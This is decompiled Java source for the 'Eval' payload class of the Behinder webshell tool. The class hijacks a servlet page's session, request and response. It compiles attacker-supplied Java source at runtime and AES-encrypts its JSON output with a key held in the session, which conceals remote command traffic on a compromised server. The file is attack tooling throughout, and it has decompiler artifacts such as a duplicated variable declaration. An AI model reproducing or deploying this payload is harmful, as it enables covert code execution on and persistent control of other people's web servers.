 package net.rebeyond.behinder.payload.java;
 
 import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
 import javax.tools.DiagnosticCollector;
 import javax.tools.JavaCompiler;
 import javax.tools.JavaCompiler.CompilationTask;
 import javax.tools.JavaFileManager;
 import javax.tools.JavaFileObject;
 import javax.tools.StandardJavaFileManager;
 import javax.tools.ToolProvider;
 import net.rebeyond.behinder.utils.Utils.MyJavaFileObject;
 
 
 
 
 
 
 
 
 
 
 
 
 public class Eval
 {
   public static String sourceCode;
   private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
   
   private ServletRequest Request;
   
   private ServletResponse Response;
   private HttpSession Session;
   
   public boolean equals(Object obj)
   {
     PageContext page = (PageContext)obj;
     this.Session = page.getSession();
     this.Response = page.getResponse();
     this.Request = page.getRequest();
     
 
 
 
 
     return true;
   }
   
   public void javaCompile(String fileName) throws IOException {
     JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
     
 
     StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);
     Iterable<? extends JavaFileObject> compilationUnits = fileManager
       .getJavaFileObjectsFromStrings(Arrays.asList(new String[] {fileName }));
     JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager, null, null, null, 
       compilationUnits);
     boolean success = task.call().booleanValue();
     fileManager.close();
   }
   
   public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
     byte[] classBytes = null;
     JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
     if (compiler == null)
       throw new Exception("本地机器上没有找到编译环境，请确认:1.是否安装了JDK环境;2." + System.getProperty("java.home") + File.separator + 
         "lib目录下是否有tools.jar.");
     DiagnosticCollector<JavaFileObject> collector = new DiagnosticCollector();
     StandardJavaFileManager standardJavaFileManager = compiler.getStandardFileManager(collector, null, null);
     JavaFileManager javaFileManager = standardJavaFileManager;
     
     List<String> options = new ArrayList();
     
 
 
 
 
     Pattern CLASS_PATTERN = Pattern.compile("class\\s+([$_a-zA-Z][$_a-zA-Z0-9]*)\\s*");
     Matcher matcher = CLASS_PATTERN.matcher(sourceCode);
     String cls;
     if (matcher.find()) {
       cls = matcher.group(1);
     } else {
       throw new IllegalArgumentException("No such class name in " + sourceCode);
     }
     String cls;
     JavaFileObject javaFileObject = new Utils.MyJavaFileObject(cls, sourceCode);
     
     Boolean result = compiler
       .getTask(null, javaFileManager, collector, options, null, Arrays.asList(new JavaFileObject[] { javaFileObject })).call();
     
     byte[] temp = new byte[0];
     JavaFileObject fileObject = (JavaFileObject)fileObjects.get(cls);
     if (fileObject != null) {
       classBytes = ((Utils.MyJavaFileObject)fileObject).getCompiledBytes();
     }
     return classBytes;
   }
   
   private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
     StringBuilder sb = new StringBuilder();
     String version = System.getProperty("java.version");
     sb.append("{");
     for (String key : entity.keySet()) {
       sb.append("\"" + key + "\":\"");
       String value = ((String)entity.get(key)).toString();
       if (encode) {
         if (version.compareTo("1.9") >= 0) {
           getClass();Class Base64 = Class.forName("java.util.Base64");
           Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
           value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] {
             value.getBytes("UTF-8") });
         } else {
           getClass();Class Base64 = Class.forName("sun.misc.BASE64Encoder");
           Object Encoder = Base64.newInstance();
           value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] {
             value.getBytes("UTF-8") });
           
           value = value.replace("\n", "").replace("\r", "");
         }
       }
       sb.append(value);
       sb.append("\",");
     }
     if (sb.toString().endsWith(","))
       sb.setLength(sb.length() - 1);
     sb.append("}");
     return sb.toString();
   }
   
   private byte[] Encrypt(byte[] bs) throws Exception
   {
     String key = this.Session.getAttribute("u").toString();
     byte[] raw = key.getBytes("utf-8");
     SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
     Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
     cipher.init(1, skeySpec);
     byte[] encrypted = cipher.doFinal(bs);
     return encrypted;
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/payload/java/Eval.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */